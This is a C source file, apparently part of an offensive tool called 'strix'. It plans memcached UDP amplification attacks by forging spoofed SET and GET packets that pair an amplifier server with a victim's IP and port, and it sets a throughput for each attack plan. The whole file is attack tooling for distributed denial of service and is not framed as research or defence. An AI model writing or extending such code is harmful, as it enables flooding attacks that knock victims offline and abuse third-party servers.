#include "strix.h"
#include "packetforge.h"
#include "planner.h"

static AttackData * _createAttackData( AttackDraft *draft )
{
  AttackData *newData;

  memalloc( (void *)&newData, sizeof( AttackData ), __func__); 
  newData->setPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, draft->target_port, draft->amp_port, MEMCACHED_SET );
  newData->getPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, draft->target_port, draft->amp_port, MEMCACHED_GET );
  newData->throughput = draft->throughput;
  newData->target_ip = draft->target_ip;
  newData->amp_ip = draft->amp_ip;
  
  return newData;
}

AttackPlan * Planner( AttackDraft *draft, int draftSize )
{
  AttackPlan *plan = NULL;

  assert( NULL != draft );
  assert(draftSize > 0);

  memalloc( (void *)&plan, sizeof(AttackPlan), __func__);
  memalloc( (void *)&plan->atkPlans, sizeof(AttackData) * draftSize, __func__);
  plan->totalPlans = draftSize;

  for(int i = 0; i < draftSize; i++){
    plan->atkPlans[i] = _createAttackData( &draft[i] );   
  }

  return plan;
}
